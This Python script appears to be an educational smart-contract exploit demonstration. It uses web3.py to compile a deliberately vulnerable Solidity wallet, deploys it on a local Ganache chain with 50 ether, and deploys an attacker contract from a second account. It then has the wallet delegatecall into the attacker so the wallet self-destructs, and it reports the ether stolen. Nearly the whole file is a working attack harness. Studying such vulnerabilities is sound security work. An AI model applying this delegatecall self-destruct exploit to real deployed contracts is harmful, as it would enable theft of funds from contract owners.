from web3 import Web3
from web3 import contract as c

from solcx import compile_files


def get_contract_abi_bin(contract_file):

    compiled_sol = compile_files( contract_file,
        output_values=['abi', 'bin']
    )
    return compiled_sol

def deploy_contract(abi, bin, target_address = None):

    Contract = w3.eth.contract(abi=abi, bytecode=bin)
    if(target_address == None):
        #DEPLOY WALLET WITH 50 Ether
        contract_type = "WALLET"
        tx_hash = Contract.constructor().transact({'gasPrice': w3.eth.gas_price,'value': 50000000000000000000})
    else:
        #ELSE DEPLOY ATTACK CONTRACT
        contract_type = "ATTACKER"
        tx_hash = Contract.constructor(target_address).transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    contract = w3.eth.contract(
    address=tx_receipt.contractAddress,
    abi=abi
    )
    print(f"{contract_type} CONTRACT DEPLOY WITH ADDRESS: {contract.address}")
    return contract

#### CONNECT WEB3PY TO GANACHE
w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))
accounts = w3.eth.accounts

w3.eth.default_account = accounts[0]

compiled_contracts = get_contract_abi_bin("./WalletSelfDestructableByAnyone.sol")

for ctr in compiled_contracts:

    if(ctr == 'WalletSelfDestructableByAnyone.sol:Attack'):
        attack_abi_bin = (compiled_contracts[ctr]['abi'], compiled_contracts[ctr]['bin'])

    if(ctr == 'WalletSelfDestructableByAnyone.sol:Wallet'):
        wallet_abi_bin = (compiled_contracts[ctr]['abi'], compiled_contracts[ctr]['bin'])


##### DEPLOY WALLET WITH ACCOUNT 0
wallet = deploy_contract(wallet_abi_bin[0], wallet_abi_bin[1])
wallet = c.ImplicitContract(wallet)

##### DEPLOY ATTACK WITH ACCOUNT 1
w3.eth.default_account = accounts[1]
attack_init_balance = w3.eth.get_balance(accounts[1])
attack  = deploy_contract(attack_abi_bin[0], attack_abi_bin[1], wallet.address)

attack_address = attack.address

try:
    wallet.delegateCallToAnotherContract(attack_address)
except Exception as e:
    print(e)
    print("Not owner.")
    exit(0)

stolen_ether = w3.eth.get_balance(accounts[1])-attack_init_balance
stolen_ether = w3.fromWei(stolen_ether, 'ether')
print(f"\nAttacker was able to self destruct and steal {stolen_ether} from Wallet: {wallet.address}")
    

